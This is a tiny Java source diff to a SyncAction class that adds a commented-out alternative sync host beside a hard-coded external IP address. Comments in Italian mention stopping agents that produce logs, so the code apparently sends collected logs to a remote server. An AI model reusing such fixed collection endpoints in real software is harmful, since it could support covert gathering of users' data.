@@ -110,6 +110,7 @@ public final class SyncAction extends SubAction {
 
             //host = "192.168.1.177";
             host = "89.96.137.6";
+            //host = "iperbole.suppose.it"; port = 8080;
             transfer.init(host, port, ssl, wifi);
 
             // Stop degli agenti che producono un singolo log
